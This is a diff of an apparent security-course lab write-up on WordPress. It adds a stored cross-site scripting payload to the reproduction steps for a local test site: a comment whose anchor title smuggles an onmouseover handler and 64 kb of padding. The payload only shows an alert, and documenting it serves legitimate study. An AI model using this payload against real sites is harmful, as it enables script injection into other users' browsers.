@@ -15,7 +15,7 @@ Time spent: **6** hours spent in total
   - [x] Steps to recreate: 
 		1. go to wpdistillery.local;
 		2. go to comment section of a post;
-		3. comment:
+		3. comment: "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>"
   - [x] Affected source code: core wp
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Required) Vulnerability Name or ID
